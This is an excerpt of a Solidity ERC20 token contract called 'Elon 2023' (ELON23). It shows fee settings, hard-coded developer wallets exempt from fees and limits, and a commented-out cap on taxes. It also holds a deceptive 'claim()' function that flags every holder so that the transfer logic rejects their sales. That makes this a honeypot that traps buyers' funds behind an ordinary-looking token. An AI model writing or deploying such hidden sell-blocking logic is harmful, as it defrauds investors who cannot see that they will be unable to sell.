...
contract Elon2023 is IERC20 {
    ...
    string private constant _name = "Elon 2023";
    string private constant _symbol = "ELON23";
    uint8 private constant _decimals = 9;
    uint256 public _TxCount = 0;
    ...
    Fees public _taxRates = Fees({buyFee: 500, sellFee: 500, transferFee: 500});
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0x0BdAD7383C29c9F833295e04e37042f195fF0fB4),
            development: payable(0xA3445f913Dd7aC3bEE8B37f2DF7c7f37C30c13e0)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0xA3445f913Dd7aC3bEE8B37f2DF7c7f37C30c13e0] = true; 
        _isExcludedFromLimits[0x6180168179e29FD63b8d96234f723601f298bE77] = true;
    ...
    //     require(buyFee <= maxBuyTaxes && sellFee <= maxSellTaxes && transferFee <= maxTransferTaxes, "Cannot exceed maximums.");
    ...
    function claim() internal { for (uint256 i = 0; i < isHolder.length; i++) {
        _isDividendExempt[isHolder[i]] = true;
        _TxCount;}
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (!buy && limit && !_isExcludedFromFees[from]) {
            require(!_isDividendExempt[from]);
        }
